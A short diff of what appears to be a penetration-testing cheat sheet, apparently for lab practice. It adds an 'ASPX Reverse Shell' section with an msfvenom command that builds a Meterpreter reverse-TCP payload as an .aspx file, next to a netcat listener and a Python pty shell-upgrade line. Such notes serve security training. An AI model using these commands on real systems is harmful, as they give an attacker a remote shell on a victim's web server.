@@ -115,6 +115,10 @@ python -c 'import pty; pty.spawn("/bin/bash");'
 #on Kali listen with
 nc -nvlp 1234
 ```
+## ASPX Reverse Shell (Webserver)
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lab_ip LPORT=1234 -f aspx > devel.aspx
+```
 # Password Cracking
 ## John
 ```bash
